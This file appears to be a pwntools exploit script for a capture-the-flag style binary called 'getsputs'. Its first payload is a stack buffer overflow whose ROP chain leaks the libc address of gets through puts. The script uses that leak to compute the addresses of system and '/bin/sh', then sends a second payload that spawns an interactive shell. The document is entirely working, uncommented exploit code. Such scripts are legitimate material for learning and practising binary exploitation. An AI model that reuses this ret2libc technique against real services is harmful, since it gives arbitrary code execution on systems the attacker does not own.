from pwn import *

binary = "./getsputs"
e = ELF(binary)
l = e.libc
# l = ELF("/lib/x86_64-linux-gnu/libc.so.6")
p = process(binary)

# context.log_level = "debug"

main = e.symbols['main']
puts_plt = e.plt['puts']
gets_got = e.got['gets']

pop_rdi = 0x0000000000401176 # pop rdi ; ret

payload = b"A" * 0x50
payload += b"A" * 0x8
payload += p64(pop_rdi)
payload += p64(gets_got)
payload += p64(puts_plt) 
payload += p64(main)

p.sendline(payload)

p.recvuntil(b"\x76\x11\x40\x0a")
libc_gets = p.recvn(0x6) + b"\x00\x00"
libc_base = u64(libc_gets) - l.symbols['gets']
libc_sys = libc_base + l.symbols['system']
binsh = libc_base + next(l.search("/bin/sh"))

log.info("libc_gets: " + hex(u64(libc_gets)))
log.info("libc_base: " + hex(libc_base))
log.info("libc_sys: " + hex(libc_sys))
log.info("binsh: " + hex(binsh))

payload = b"A" * 0x50
payload += b"A" * 0x8
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(libc_sys)

p.sendline(payload)

p.interactive()